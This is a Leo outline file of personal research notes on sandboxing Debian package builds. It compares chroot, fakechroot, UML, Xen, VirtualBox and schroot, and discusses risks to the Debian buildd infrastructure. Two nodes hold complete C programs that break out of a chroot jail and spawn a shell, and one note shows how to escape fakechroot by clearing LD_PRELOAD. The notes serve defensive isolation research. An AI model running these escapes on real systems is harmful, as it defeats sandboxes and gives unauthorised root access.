<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet ekr_test?>
<leo_file>
<leo_header file_format="2" tnodes="0" max_tnode_index="21" clone_windows="0"/>
<globals body_outline_ratio="0.5">
	<global_window_position top="0" left="138" height="933" width="800"/>
	<global_log_window_position top="0" left="0" height="0" width="0"/>
</globals>
<preferences/>
<find_panel_settings/>
<vnodes>
<v t="zaril.20100923035154" a="E"><vh>Isolation research</vh>
<v t="zaril.20100923035154.1" a="EM"><vh>explore fakechroot</vh></v>
<v t="zaril.20100923035154.2" a="M"><vh>research chroot (why only root?)</vh>
<v t="zaril.20100923035154.3"><vh>break out of chroot exploit</vh></v>
<v t="zaril.20100923035154.4"><vh>break out of chroot exploit #2</vh></v>
</v>
<v t="zaril.20100923035316"><vh>security analysis of debian buildd infrastructure</vh></v>
<v t="zaril.20100923035316.1" a="M"><vh>explore openvz</vh></v>
<v t="zaril.20100923035316.2" a="M"><vh>explore vmware</vh></v>
<v t="zaril.20100923035316.3" a="M"><vh>explore xen</vh>
<v t="zaril.20100923035316.4"><vh>explore ubuntu support for xen</vh></v>
</v>
<v t="zaril.20100923035316.5" a="MTV"><vh>explore uml</vh>
<v t="zaril.20100923035316.6"><vh>explore rootstrap</vh></v>
<v t="zaril.20100923035316.7"><vh>explore pbuilder-uml</vh></v>
<v t="zaril.20100923035316.8" a="M"><vh>explore tun/tap</vh></v>
</v>
<v t="zaril.20100923035316.10" a="M"><vh>explore virtualbox</vh></v>
<v t="zaril.20100923035316.11" a="M"><vh>explore dchroot / schroot</vh>
<v t="zaril.20100923035316.12"><vh>time chroot tarball extraction</vh></v>
</v>
<v t="zaril.20100923035316.13" a="E"><vh>explore vserver</vh></v>
<v t="zaril.20100923035316.14"><vh>explore linux capabilities</vh></v>
<v t="zaril.20100923035316.15" a="EM"><vh>explore grsecurity chroot security</vh></v>
</v>
</vnodes>
<tnodes>
<t tx="zaril.20100923035154">@nocolor

* SUMMARY
roadmap
    new
        hardened chroot for everything
    
    old
        everything as root on local machine
        (insecure) suid chroot implementation
        VM-based chroot and pbuilding?
            headless
            debootstrap based
            build environment fabricated with the product?
                +persistence?
        
with regular chroot, pbuilding and fab-spec-install both need virtual machines
    pbuilding can't be done securely inside a chroot as user
        we just need to optimize pbuilder to use deck

    because it needs to install build-depends, as root

    if pbuilding isn't critical, then we can use UML despite its poor performance for the other stuff
        
    unless we turn OFF auto resolution of build dependencies
        and install them by hand

debian build infrastructure vulnerable by design
    binaries built on untrusted systems
        i386 architecture uploaded by developers

    compromising the buildd is easy
        upload a trojaned build-depends
        build-depends breaks out of chroot

more solutions possible with hardware support
    KVM
    
we have to use a virtual machine for fabrication though
    for populating the 

fakeroot + fakechroot isn't a good enough simulation

root inside chroot is equivalent to root outside chroot
    many ways to escape
    if we prevent escape - the chroot isn't powerful enough to fabricate inside
        no mounts
        no sub-chroots

    any package we install could compromise security (dpkg -i)
        postinst scripts could execute exploit
        
        we'll be running the development system with an overlay
            only the kernel will be secure

if we use a virtual machine we can limit exposure 
    fabricate inside a non-persistent environment
        changes go away after fabrication
    sync result back to fakeroot

leading contendors
    Xen

    virtualbox?

        does it run as root?
            if not we could run it as a separate user and setuid to it

    UML

compartmentalization options
    operating system level
        chroot
        openvz
        vserver

    hardware-level
        full virtualization (requires CPU support)
            KVM
                uses modified version of qemu
            Xen
        paravirtualization
            xen
        emulation
            vmware

software
    qemu - insecure and slow
        with kqemu - near native
        qvm86 - near native

    virtualbox - based on qemu
        could share its security problems
        
* SCRATCH
programs to explore
    chroot_safe
        chroot any dynamically linked application in a safe manner?

* IDEAS
secure local chroots with grsecurity
    harden the chroot source (remove devices)

secure chroot
    drop process privileges using capabilities

    build in a vserver environment

    use grsecurity's chroot limitations
        would prevent at least some things from working

use pbuilder (optimized?)
    run pdebuild from sudo

preinstall build dependencies into an chroot environment
    drop privileges (capabilities) to prevent break out of chroot attacks?
        is it possible to do that locally?

run everything as root and rely on a MAC policy to restrict privileges?

side-step grsecurity altogether by using uml...
    integrated into kernel

use UML to create fake root-like environment
    for package building
    for rootstrapping
    calculate approximate size of 

    keep offshoot of UML builder around like a daemon
    invocation of UML transparent?
        uml &lt;uml&gt; [ command ] 
            first boots uml if it doesn't exist
        
    rsync result back to fakeroot system
        make chroot transparent?
        like a form of dchroot?
            uml chroot?

    insight - we only need one uml to do this in
        is there any reason we would need more than one uml session?
            prevent compromise of one release to effect another release?

use XEN instead of UML
    xen is much faster
        almost native performance

    "resume" from an already booted state

just ignore the pool problem and decree that it runs as root?

suid root chroot

pbuilder in fakeroot / fakechroot environment?

use uml?
    thats what rootstrap does

RESOURCE: http://slashdot.org/comments.pl?threshold=5&amp;mode=thread&amp;commentsort=0&amp;op=Change&amp;sid=234745

performance evaluation of xen vs openVZ

RESOURCE: http://en.wikipedia.org/wiki/Comparison_of_virtual_machines


RESOURCE: http://en.wikipedia.org/wiki/Virtualization

emulation
    hardware virtualized - dynamic recompilation

RESOURCE: http://en.wikipedia.org/wiki/Virtual_Machine_Interface

VMI - Virtual Machine Interface

openstandard proposed describing the protocol that guest OSes communicates with the virtual machine


paravirtualization - doesn't simulate hardware - offers a pecial API

    hypervisor / hypercalls
</t>
<t tx="zaril.20100923035154.1">SUMMARY
    won't work with statiatically linked programs (neither does fakeroot)

    it allows chroot() to work without root privileges
        you don't even need to be fakeroot

    symlinks out of the chroot work
        need to be created before chroot

    Segmentation faults if library in chroot is incompatible with library inside chroot       
        workaround: -s --use-system-libs

    for debuild to work you need to use --preserve-env option

    debootstrap fakechroot doesn't actually work
        unless you debootstrap the exact same system

    even fake setuid works (e.g., su user)
        doesn't actually implement fake permissions though
        if I create a file as "bin", its created as "root"
            if I want I can chroot the file to bin
        "bin" can still read /etc/shadow

    try upgrading jaunty to karmic in fakeroot
        cp -ad jaunty karmic
  
        gotcha:
            /proc is copied over (at least it tries)

        result: it failed trying to update the libc
            not very surprising

        
cat fakeroot.sh
    export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/bin/X11
    fakeroot -i fake.state -s fake.state fakechroot

        

TODO:
    try debootstrapping jaunty inside jaunty

    explore pbuilder in fakeroot/fakechroot
        read manual - I think it says something about this

    investigate bug report page for fakechroot

    investiage the SVN activity at alioth

    read discussions on debian devel
    
QUESTIONS

Q: are we root?
A: no
---
Q: does it work with fakeroot together?
A: yes

Q: can we get apt to work inside a fakechroot?
A: yes, and debootstrap is actually supposed to work in there
    debootstrap does quite a lot of apt installing and configuring
---
Q: does unsetting LD_PRELOAD break out of the imaginary chroot?
A: yes, programs will see their real root, but your shell will remain fooled

    LD_PRELOAD="" /bin/pwd
--- 

Q: does the fakechroot variant of debootstrap work?
    Q: how does it handle /proc and /dev/pts?
    A: fakechroot supports linking out of `chroot'

    export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/bin/X11
    fakeroot -s fakechroot.save fakechroot debootstrap --variant=fakechroot karmic karmic
    

    GOTCHA: trying to chroot into debootstrapped system - segmentationfault

    E: debootstrap sid as a regular user
        fakeroot -s fakechroot.save fakechroot debootstrap --variant=fakechroot sid sid
    R: segmentation fault
    ---
    E: fakechroot -s fakeroot -s sid.save debootstrap --variant=fakechroot sid sid

I: Installing core packages...
W: Failure trying to run: chroot /home/z/tmp/sid dpkg --force-depends --install var/cache/apt/archives/base-files_4.0.1_i386.deb var/cache/apt/archives/base-passwd_3.5.13_i386.deb

        fakechroot -s fakeroot -i sid.save
    BUG: tmp.ci required as a directory, but seen inside fakeroot as a file


fakechroot -s fakeroot -i sid.save chroot /home/z/tmp/sid dpkg --force-depends --install var/cache/apt/archives/base-files_4.0.1_i386.deb var/cache/apt/archives/base-passwd_3.5.13_i386.deb 


E: try fakechroot + cdebootstrap
        
E: does pbuilder work inside fakechroot?


IDEAS:
    even if some packages don't work well with fakechroot
        we can always patch those packages

    debootstrap is being used in fakechroot
    
    

debootstrapping in fakechroot

can we get pbuilder to work inside a fakechroot environment?

RESOURCE: http://www.webservertalk.com/message1840061.html
    fakechroot - anyone using it, should I consider hijacking it?

at least some people are using fakechroot to do installer building as a regular user

RESOURCE: fakechroot(1)

LIMITATIONS
   o   /lib/ld-linux.so.2 is always loaded from real environment. This path is hardcoded by
       linker for all binaries.

   o   Every command executed within fakechroot needs to be linked to the same version of the
       C library as fakechroot itself. If the libraries in chroot are not compatible, try to
       use --use-system-libs option.

   o   You can provide symlinks to the outside. The symlink have to be created before chroot
       is called. It can be useful for accessing the real /proc and /dev directory.

   o   Statically linked binaries doesn't work, especially ldconfig(8), so you have to wrap
       this command with dummy version and i.e. set the dpkg diversion, see: dpkg-divert(8).

   o   ldd(1) also doesn't work. You have to use wrapper. The example wrapper is available at
       scripts/ directory in fakechroot's source package and it is located at
       /usr/share/doc/fakechroot/examples directory.

   o   The full screen applications hangs up if /dev/tty file is not a real device. Link
       /dev/tty file or whole /dev directory to the real one or remove it from fake chroot
       environment.

   o   lckpwdf() and ulckpwdf() are ignored so passwd(1) command should work

   o   Your real uid should exist in /etc/passwd. Create it with adduser --uid realuid
       realuser.

   o   debuild(1) cleans environment. Use --preserve-env option to prevent this behaviour.</t>
<t tx="zaril.20100923035154.2">SUMMARY
    chroot is a dangerous privilege to grant normal users

    chroot wasn't designed as a security mechanism but as a software testing tool



DISCOVERY:  chrsh

Q: why can't we chroot as users?
A: 

1) supposedly to prevent users from changing the contents of trusted files and tricking suid programs into giving permissions


    I.e., after chroot /tmp, /etc/passwd -&gt; /tmp/etc/passwd
    Q: how do you sneak the suid program into the chroot?
    A: with a hardlink
        DISCOVERY: its possible for a regular user to create hardlinks to root suid programs

    solution: disable suid programs in chroot?
2) escape from chroot using chroot
  int fd = open("/", O_RDONLY);        // get jail's / as an fd
  mkdir("testdir");
  chroot("testdir");                   // make nested jail -- key to escape!
  fchdir(fd);                          // back to first jail's /
  for (int i=0; i&lt;10; i++) {
    chdir("..");                       // successively higher ("/../"=="/")
  }
  chroot(".");                         // final "jail" is real /
  execl("/bin/sh", "/bin/sh", NULL);   // unjailed shell

keywords: chroot, user chroot, suid chroot, non-root chroot

RESOURCE: http://www.unixwiz.net/techtips/chroot-practices.html

other ways to break out of chroot
    mknod
        create raw disk device
        create /dev/mem
    hardlinks lead outside the jail (via fchdir)
    ptrace

how to secure chroot
    run in the jail as a non-root user

    no setuid programs inside the chroot

RESOURCE: http://www.bpfh.net/simes/computing/chroot-break.html
    How to break out of a chroot() jail

    includes C demo program for breaking out

coding with chroot in anger
    chdir("/foo/bar");
    chroot("/foo/bar");
    setuid(non zero UID);



RESOURCE: http://lists.freebsd.org/pipermail/freebsd-security/2003-April/000124.html

chroot(2) has no effect on process's current directory
    you could hide a hardlink to the setuid program there

RESOURCE: http://lists.debian.org/debian-security/2001/10/msg00033.html
            </t>
<t tx="zaril.20100923035154.3">001    #include &lt;stdio.h&gt;  
002  	 #include &lt;errno.h&gt;  
003  	 #include &lt;fcntl.h&gt;  
004  	 #include &lt;string.h&gt;  
005  	 #include &lt;unistd.h&gt;  
006  	 #include &lt;sys/stat.h&gt;  
007  	 #include &lt;sys/types.h&gt;  
008  	    
009  	 /*  
010  	 ** You should set NEED_FCHDIR to 1 if the chroot() on your  
011  	 ** system changes the working directory of the calling  
012  	 ** process to the same directory as the process was chroot()ed  
013  	 ** to.  
014  	 **  
015  	 ** It is known that you do not need to set this value if you  
016  	 ** running on Solaris 2.7 and below.  
017  	 **  
018  	 */  
019  	 #define NEED_FCHDIR 0  
020  	    
021  	 #define TEMP_DIR "waterbuffalo"  
022  	    
023  	 /* Break out of a chroot() environment in C */  
024  	    
025  	 int main() {  
026  	   int x;            /* Used to move up a directory tree */  
027  	   int done=0;       /* Are we done yet ? */  
028  	 #ifdef NEED_FCHDIR  
029  	   int dir_fd;       /* File descriptor to directory */  
030  	 #endif  
031  	   struct stat sbuf; /* The stat() buffer */  
032  	    
033  	 /*  
034  	 ** First we create the temporary directory if it doesn't exist  
035  	 */  
036  	   if (stat(TEMP_DIR,&amp;sbuf)&lt;0) {  
037  	     if (errno==ENOENT) {  
038  	       if (mkdir(TEMP_DIR,0755)&lt;0) {  
039  	         fprintf(stderr,"Failed to create %s - %s\n", TEMP_DIR,  
040  	                 strerror(errno));  
041  	         exit(1);  
042  	       }  
043  	     } else {  
044  	       fprintf(stderr,"Failed to stat %s - %s\n", TEMP_DIR,  
045  	               strerror(errno));  
046  	       exit(1);  
047  	     }  
048  	   } else if (!S_ISDIR(sbuf.st_mode)) {  
049  	     fprintf(stderr,"Error - %s is not a directory!\n",TEMP_DIR);  
050  	     exit(1);  
051  	   }  
052  	    
053  	 #ifdef NEED_FCHDIR  
054  	 /*  
055  	 ** Now we open the current working directory  
056  	 **  
057  	 ** Note: Only required if chroot() changes the calling program's  
058  	 **       working directory to the directory given to chroot().  
059  	 **  
060  	 */  
061  	   if ((dir_fd=open(".",O_RDONLY))&lt;0) {  
062  	     fprintf(stderr,"Failed to open "." for reading - %s\n",  
063  	             strerror(errno));  
064  	     exit(1);  
065  	   }  
066  	 #endif  
067  	    
068  	 /*  
069  	 ** Next we chroot() to the temporary directory  
070  	 */  
071  	   if (chroot(TEMP_DIR)&lt;0) {  
072  	     fprintf(stderr,"Failed to chroot to %s - %s\n",TEMP_DIR,  
073  	             strerror(errno));  
074  	     exit(1);  
075  	   }  
076  	    
077  	 #ifdef NEED_FCHDIR  
078  	 /*  
079  	 ** Partially break out of the chroot by doing an fchdir()  
080  	 **  
081  	 ** This only partially breaks out of the chroot() since whilst  
082  	 ** our current working directory is outside of the chroot() jail,  
083  	 ** our root directory is still within it. Thus anything which refers  
084  	 ** to "/" will refer to files under the chroot() point.  
085  	 **  
086  	 ** Note: Only required if chroot() changes the calling program's  
087  	 **       working directory to the directory given to chroot().  
088  	 **  
089  	 */  
090  	   if (fchdir(dir_fd)&lt;0) {  
091  	     fprintf(stderr,"Failed to fchdir - %s\n",  
092  	             strerror(errno));  
093  	     exit(1);  
094  	   }  
095  	   close(dir_fd);  
096  	 #endif  
097  	    
098  	 /*  
099  	 ** Completely break out of the chroot by recursing up the directory  
100  	 ** tree and doing a chroot to the current working directory (which will  
101  	 ** be the real "/" at that point). We just do a chdir("..") lots of  
102  	 ** times (1024 times for luck :). If we hit the real root directory before  
103  	 ** we have finished the loop below it doesn't matter as .. in the root  
104  	 ** directory is the same as . in the root.  
105  	 **  
106  	 ** We do the final break out by doing a chroot(".") which sets the root  
107  	 ** directory to the current working directory - at this point the real  
108  	 ** root directory.  
109  	 */  
110  	   for(x=0;x&lt;1024;x++) {  
111  	     chdir("..");  
112  	   }  
113  	   chroot(".");  
114  	    
115  	 /*  
116  	 ** We're finally out - so exec a shell in interactive mode  
117  	 */  
118  	   if (execl("/bin/sh","-i",NULL)&lt;0) {  
119  	     fprintf(stderr,"Failed to exec - %s\n",strerror(errno));  
120  	     exit(1);  
121  	   }  
122  	 }  </t>
<t tx="zaril.20100923035154.4">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;errno.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/types.h&gt;

int main(void)
{
    int i;
    
    mkdir("breakout", 0777);
    if (chroot("breakout") &lt; 0)
        perror("chroot failed");

    for (i = 0; i &lt; 100; i++)
        if (chdir("..") &lt; 0)
            perror("chdir failed");
    if (chroot(".") &lt; 0)
        perror("chroot2 failed");

    execl("/bin/bash", "/bin/bash", (char *)NULL);
    perror("system failed");
    
    exit(0);
}
    </t>
<t tx="zaril.20100923035316">buildd uses sbuild
    sbuild installs build-depends as source?

some of the buildds are run by non-DDs that can not be trusted

a binary trojan could be uploaded

then reuploaded to hide / cover tracks

all arch packages are not compiled by buildds - need to be uploaded by the author


RESOURCE: http://lists.debian.org/debian-security/2004/09/msg00014.html

RESOURCE: http://lists.debian.org/debian-security/2004/09/msg00015.html

discusses attacks against debian infrastructure


RESOURCE: http://lists.debian.org/debian-security/2004/09/msg00018.html

sid is not a signed release?

RESOURCE: http://lists.debian.org/debian-security/2004/09/msg00063.html

poisoning buildds

RESOURCE: http://lists.debian.org/debian-security/2004/09/msg00025.html

chroots designed to produce clean builds





</t>
<t tx="zaril.20100923035316.1">advantage
    files can be seen (not in an image)

RESOURCE: http://kerneltrap.org/node/6492

openVZ patchset weighs in at 70K (2MB)

operating system level (need to patch host)

configurable resource groups
    CPU
    memory
    disk quota

different project from vserver

doesn't run a separate kernel in each VPS

don't need to specify memory for each virtual machine / disk device

xen is superior in performance and stability

git.openviz.org


RESOURCE: http://community.livejournal.com/openvz/tag/openvz

has been merged into SLES
</t>
<t tx="zaril.20100923035316.2">RESOURCE: http://en.wikipedia.org/wiki/VMware

virtual processing based on dynamic recompilation

80% speed of virtual guest

overhead 3-6% for computationally intensive applications

need vmware tools installed in guest for optimal performance

RESOURCE: http://www.vmware.com/community/message.jspa?messageID=261115

how good is the quality of the isolation?

NSA considers vm isolation almost as good as air gap?

RESOURCE: http://www.thisishull.net/showthread.php?t=271743&amp;page=2

vmware guests broken into from the outside

RESOURCE: http://www.eweek.com/article2/0,1759,1904647,00.asp

at least one known exploit - nat code in vmware

    </t>
<t tx="zaril.20100923035316.3">RESOURCE: http://www.cl.cam.ac.uk/research/srg/netos/xen/

official site of the research group that created xen

RESOURCE: http://www.cl.cam.ac.uk/research/srg/netos/xen/performance.html

performance analysis (very impressive)

RESOURCE http://blog.orebokech.com/2010/05/xen-security-or-lack-thereof.html

xen secure as long as hardware virtualization no used?

xen uses AEMU's based emulator to provide emulated device?

RESOURCE: http://gentoo-wiki.com/HOWTO_Xen_and_Gentoo

feature
    *  Virtual machines with performance close to native hardware.
    * Live migration of running virtual machines between physical hosts.
    * Up to 32 virtual CPUs per guest virtual machine, with VCPU hotplug.
    * x86/32, x86/32 with PAE, and x86/64 platform support.
    * Intel Virtualization Technology (VT-x) for unmodified guest operating systems (including Microsoft Windows).
    * AMD Virtualization Technology (SVM aka Pacifica) on AM2 and F stepping Opterons (2009H2)
    * Excellent hardware support (supports almost all Linux device drivers). 

[edit] 

RESOURCE: http://www.infoworld.com/article/05/06/28/HNxensecure_1.html

XenSE - security enhanced version of XEN?

30K LOC in Xen?

RESOURE: http://en.wikipedia.org/wiki/Xen

first public release of Xen made in 2003

RESOURCE: http://gentoo-wiki.com/HOWTO_Xen_and_Gentoo

different kernels for dom0 and domU

RESOURCE: http://jailtime.org/

prefabricated virtual filesystems for Xen

RESOURCE: http://wiki.xensource.com/xenwiki/XenFaq#head-0a539c0b540b1e563d5b0f39dad4eb18034f8cee

no support for ACPI/APM
    reduced battery support and no suspend/resume

</t>
<t tx="zaril.20100923035316.4">RESOURCE: https://wiki.ubuntu.com/Xen

ideal goal - ship with xen enabled kernel by default

bandwidth between virtual machines - nearly infinite?



RESOURCE: https://wiki.ubuntu.com/XenEnabledKernel

why xen wasn't included in edgy by default

xen doesn't play nicely with nvidia kernel

probably won't be our default kernel

userspace tools
    xen-tools

RESOURCE: https://wiki.ubuntu.com/XenEdgy

xen didn't make it into edgy as the default

    but some support was included

restrictions
    hardware support not as good (linux-restricted-modules not supported)

    no security support

    packages in universe

stock kernel patched with xen guest support

    development kernel won't include ubuntu changes

RESOURCE: https://wiki.ubuntu.com/XenOnJaunty?highlight=%28xen%29

enable universe and install
    ubuntu-xen-desktop
    ubuntu-xen-server

RESOURCE: https://help.ubuntu.com/community/XenVirtualMachine

how to install xen on ubuntu

can install debian via debootstraping to loopback

VMs seem to be configured by the admin

same kernel for dom0 and the other domains





    </t>
<t tx="zaril.20100923035316.5">TODO:
    run debian inside UML?
        there's a tutorial on running debian inside UML
    setup networking so that uml has access to my apt-proxy
    read HOWTO

SUMMARY
    poor performance - poor momentum

    no patching required to host kernel
        but performance is much slower
            with skas its within 30% of host

    runs entirely as a regular user process
    kernel is compiled to a special architecture (ARCH=um)
    pbuilder supports it as a variant
    doesn't require *any* special privileges 
    utilities: usermode-utils (ebuild)
    debian uml packages have the best documentation

    ubuntu blacklisted UML back in the kernel 2.4 days
        today UML is in the mainline kernel

        still blacklisted with comment from ben collins: we do our own kernel
            its just an application though

Q: do we have to have an image file?
A: for the root yes, but not necessarily for all files (you could use humfs)

Q: is it possible to create a growable image file?

    IDEA: minimal root system that is overlayed with a host based filesystem?



DISCOVERIES
    pbuilder-uml

* RESOURCE: http://user-mode-linux.sourceforge.net/
    kernel image for testing
    
    filesystem image for testing

./linux-2.6.19-rc5 ubda=FedoraCore5-x86-root_fs mem=128M

* RESOURCE: http://user-mode-linux.sourceforge.net/source.html
    building UML from source

make defconfig ARCH=um
make menuconfig ARCH=um
make mrproper ARCH=um

make ARCH=um

result
    UML binary called linux
    if you remove debugging symbols - shrinks UML binary to size of a native kernel

RESOURCE: http://en.wikipedia.org/wiki/User-mode_Linux

as of 2.6+ integrated into main kernel source

doesn't require host kernel patching

lower performance compared to Xen and OpenVZ?

* RESOURCE: http://searchenterpriselinux.techtarget.com/tip/0,289483,sid39_gci1197366,00.html

possible to put a UML inside a chroot jail

supports tty logging

hppfs
    allows contents of UML /proc to be selectively overridden from the host?

* RESOURCE: http://user-mode-linux.sourceforge.net/hostfs.html
    explains how to access the host file's

    hostfs - direct translation of host filesystem to UML
        permission problems

    humfs - more sophisticated (fakeroot) like filesystem access

* RESOURCE: http://user-mode-linux.sourceforge.net/configure.html

how to configure the virtual machine's virtual hardware

consoles (common cases)

    configuring common cases
        con0=fd:0,fd:1 con=pts
        
        con0=fd:0,fd:1 con1=null con=pts
        
        ssl=xterm           attach serial lines to xterm
        
        ssl=port:9000       attach serial line to host's localhost 9000

ubdb=swap

ubda=cow,root_fs

ubdb=/dev/cdrom

ubdb=foo.tar

* RESOURCE: http://www.stearns.org/slartibartfast/uml-coop.html

running the virtual machine attached to screen
    screen -S linda -d -m su - linda -c "cd /homr/linda; linux"

    screen -S linda -R

* EXPLORE: usermode-utilities (ebuild)

/usr/bin/uml_watchdog
/usr/bin/uml_mconsole
/usr/bin/jailtest
/usr/bin/uml_moo
/usr/bin/uml_net
/usr/bin/tunctl
/usr/bin/uml_switch
/usr/bin/uml_mkcow
/usr/lib/uml/port-helper
/usr/share/doc/usermode-utilities-20040406-r1/COPYING.gz

* RESOURCE: https://wiki.ubuntu.com/UserModeLinuxSpec
    UML support is planned - they just haven't gotten around to it yet
        I think Karmic may support UML

* RESOURCE: file:///home/z/docs/uml/HOWTO_User_Mode_Linux.html
Gentoo HOWTO 

skas patch increases performance
    but you can do without it


* RESOURCE: file:///home/z/docs/uml/user-mode-linux.sourceforge.net/old/skas.html

traditional solution - tracing thread mode runs alongside UML
    the kernel runs inside the same memory space as processes

skas - separate kernel address space

speedup - eliminating signal delivery that used to happen for every UML system call

eliminates honeypot fingerprinting

how to use SKAS
    CONFIG_MODE_SKAS should be enabled
        detects host support and uses it, otherwise, falls back to tt version
            
            Checking for the skas3 patch in the host...found
            Checking for /proc/mm...found

    performance
        kernel build - twice as fast with skas
            within 30% of host performance

is skas running on my Gentoo
    no



</t>
<t tx="zaril.20100923035316.6">* SUMMARY
create a filesystem image 
available as a Gentoo ebuild
    depends on vanilla sources
        for UML?

python program
    originally written in 2002 by matt zimmerman

reads /etc/rootstrap/rootstrap.conf first
    then rootstrap.conf in CWD

filesystem type can be set
    fstype=ext2

the `modules' seem to be executed directly from init

* QUESTIONS
doesn't need root access?

* RESOURCE: rootstrap(1)

* RESOURCE: http://people.debian.org/~torsten/rootstrap.html
    using rootstrap for package checking</t>
<t tx="zaril.20100923035316.7">uses rootstrap to create UML image

IDEAS:
    keep UML environment around
</t>
<t tx="zaril.20100923035316.8">http://en.wikipedia.org/wiki/TUN/TAP

In computer networking, TUN and TAP are virtual network kernel drivers. They implement network devices that are supported entirely in software, which is different from ordinary network devices that are backed up by hardware network adapters.

TAP (as in network TAP) simulates an Ethernet device and it operates with Layer 2 packets such as Ethernet frames. TUN (as in network TUNnel) simulates a network layer device and it operates with Layer 3 packets such as IP packets. TAP is used to create a Network bridge, while TUN is used with Routing.

Packets sent by an operating system via a TUN/TAP device are delivered to a user-space program that attaches itself to the device. A user-space program may also pass packets into a TUN/TAP device. In this case TUN/TAP device delivers (or "injects") these packets to the operating system network stack thus emulating their reception from an external source.</t>
<t tx="zaril.20100923035316.10">/etc/init.d/vboxdrv
/etc/init.d/vboxnet

Q: does it run without root privileges?
A:
    no suid binaries
        on the other hand - it needs a kernel module
---
Q: is there a head-less mode?
    Q: can we attach to the head later? (for debugging?)
A: yes, headless mode with VRDP. attach with RDP.
---
Q: can we create non-persistent branches programatically?
A:
    any configuration is possible via VBoxManage
---
Q: can we create the disk image file programmatically?
A:
    yes, you can convert from a dd image
    AND you can create a disk image and install to it
---
Q: can we mount the disk from the host?
A:
    to the 

Q: does the virtual disk file grow on demand?

SUMMARY
    installed by downloading the generic linux package and running it

    full screen mode works better than in vmware

    dsl loaded extremely quickly

    RIGHT CTRL - host key

    disk images grow dynamically
        special virtualbox format

    bootsplash mode seems to work better in virtualbox than in vmware
        switching from X to console actually works (unlike in vmware)
            RIGHT CTRL + F1

    supports write-through mode
        not included in snapshots (remain unaltered when machine reverted)

    the NAT's address doesn't show up as a network interface
        the vm behaves just like a regular process

        only UDP and TCP work
        ping doesn't work
            you need root privileges for ping (VirtualBox runs as a user app)
        
    VirtualBox high-level GUI

    VBoxManage cli interface

    each VM in its own window
        paused machines grey out

    virtualbox supports vmware's disk format?

    VirtualBox supports seamless windows 
        with guest additions installed in Windows

    supports immutable images
        different VMs send 

    write-through disks state not saved in suspension

    vboxmanage convertdd &lt;thefile&gt;.img &lt;thefile&gt;.vdi    

IDEAS
    we could just install debian/ubuntu to the system (normal way via ISO)
    or better yet, we could use turnkey build system
        persistent only to harddrive

RESOURCE: UserManual.pdf v1.5

features
    virtual ACPI support
    I/O APIC support
    snapshots
    access via VRDP (virtualbhox Remote Desktop Protocol)
        connect local USB dvices to virtual machine running remotely

installs a kernel module
    used for physical memory allocation
    gain control of processor for guest system execution


user must be member of vboxusers

interfaces
    VirtualBox
    VBoxSDL
    VBoxManage

default debian settings
    debconf-set-selections vboxconf

NAT port forwarding
    VBoxManage setextradata "Guest" VBoxInternal/Devices/pcnet/0/LUN#0/Config/&lt;service&gt;/Protocol TCP
    VBoxManage setextradata "Guest" VBoxInternal/Devices/pcnet/0/LUN#0/Config/&lt;service&gt;/GuestPort 22
    VBoxManage setextradata "Guest" VBoxInternal/Devices/pcnet/0/LUN#0/Config/&lt;service&gt;/HostPort 2222

HIF (Host Interface Networking)
    setup a new network card (e.g., vbox0) on host, to which guests are connected

TAP is built-in support for virtual network devices
    VirtualBox must have access to /dev/net/tun

    permanent network interfaces to which guests can attach
        easier to set up
    or dynamic interface for guests when they are started and removed when stopped
        requires admin password when interfaces are created/removed


uses UML utilities to manipulate the TAP device
    you can use TAP instead of vbox interfaces

supports Internal networking
    vbox's must run as the same user

front-ends
    start machine with GUI stop from command line

virtualbox exposes all of its features in a clean COM/XPCOM API

7.2 vboxManage

exposes more features than the main GUI

toolkit design

list vms
    
startvm
    -type vrdp
        starts machine headless
            rdesktop -a 24 localhost
                two mouse pointers unless you install guest additions

controlvm # to pause or save

modifyvm # can't be used while vm is on or saved

7.3 VBoxSDL

minimal GUI to the VM
    controllable via VBoxManage

VBoxSDL -vm "ubuntu edgy"

7.4 VRDP

extended RDP (graphics and audio)

modifyvm &lt;vmname&gt; 
    -vrdp on
    -vrdpport -vrdpauthtype

VBoxVRDP -startvm &lt;uuid|name&gt;


8.17 VBoxManage getextradata/setextradata

9.3 custom external VRDP authentication library API

9.4 secure labeling with VBoxSDL

-securelabel -sec labelfnt /path/to/font -seclabelsize 14 ...

labeling is a bit tricky due to adjustment of non-standard resolutions

9.6 multiple monitors for guest

modifyvm &lt;vmname&gt; -monitor 3

specify which screen you want to conect to with @1, @2 in domain logon

9.9.2 access physical hard disks

supported as part of VMDK

VBoxManage internalcommands
    createrawvmdk
        -filename /path/to/file.vmdk
        -rawdisk /dev/sda5 [ -partitions ]
       
RESOURCE: http://forums.virtualbox.org/viewtopic.php?t=52

thread discussing how to mount VDI (fixed size only)

sudo mount -t ntfs-3g -o loop,\
uid=user,gid=group,umask=0007,fmask=0117,offset=\
0x$(hd -n 1000000 ~/.VirtualBox/VDI/image.vdi | \
grep "eb 52 90 4e 54 46 53" | cut -c 1-8) \
.VirtualBox/VDI/image.vdi ~/mnt/


VDI - Virtual Disk Image

RESOURCE: http://www.virtualbox.org/wiki/VirtualBox_architecture

virtualization hidden behind a shared library 

system is built with a modular architecture

Mozilla's XPCOM is used as the internal API

virtual machine is just another process

what the kernel module doesn't do
    doesn't mess around with the scheduler / process management

states that the VM can be in
    executing host ring-3 code/host ring-0 code    
    emulating guest code slowly (within ring-3 host VM process)
        guest code disables interrupts
        LIDT caused a trap that needs to be emulated
        real-mode code (BIOS code, operating system startup)
    running guest ring-3 natively
emulating guest

RESOURCE: http://www.innotek.de/index.php

government contractor

privately held and internally funded software company in Germany

founded in 1992
    sells OS/2 and supports OS/2 line of produts

involved with virtualization from the beginning

products
    hyperkernel for embedded system - used in military scenarios

partners
    IBM Global Services partner

    helped Microsoft develop several features of their virtualization products

    secunet
        co-developing security infrastructure for government use


    </t>
<t tx="zaril.20100923035316.11">IDEAS
    hack schroot to support VM chroots?
    hack schroot to support deck?
    just use LVM snapshot type schroot instead of deck?


SUMMARY 

dchroot is a variant of schroot (they come from the same source)
    schroot drop in replacement for dchroot that offers much more functionality

schroot supports arbitrary users with PAM authentication

schroot supports session managed chroot types
        
schroot.conf
    supported chroots type=
        plain
        directory
        file
            .tar .tar.gz .ar.bz2 .tgz .tbz .zip
        block-device
